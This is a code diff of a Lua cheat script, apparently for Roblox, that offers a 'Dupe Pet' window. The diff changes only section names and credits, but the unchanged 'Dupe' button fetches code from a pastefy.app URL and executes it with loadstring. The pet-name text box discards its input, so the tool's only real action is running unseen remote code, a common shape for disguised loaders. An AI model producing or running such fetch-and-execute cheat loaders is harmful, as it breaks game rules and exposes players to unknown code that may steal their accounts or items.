@@ -3,10 +3,9 @@ local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")
 
 -- Вкладка Dupe Pet
 local DupeTab = Window:NewTab("Dupe Pet")
-local DupeSection = DupeTab:NewSection("Dupe Pet")
-DupeSection:NewLabel("Credits: Made by Mangekoy2 | v2.0") -- Вторая строчка слева
+local DupeSection = DupeTab:NewSection("DUPE PET")
 
--- Текстовое поле с подсказкой
+-- Текстовое поле
 local InputField = DupeSection:NewTextBox("", "Write any pet", function(text)
     -- Обработка введенного текста
 end)
@@ -20,6 +19,7 @@ DupeSection:NewButton("Dupe", "", function()
     loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
 end)
 
--- Вкладка Credits
+-- ОТДЕЛЬНАЯ вкладка Credits
 local CreditsTab = Window:NewTab("Credits")
-CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
+local CreditsSection = CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
+
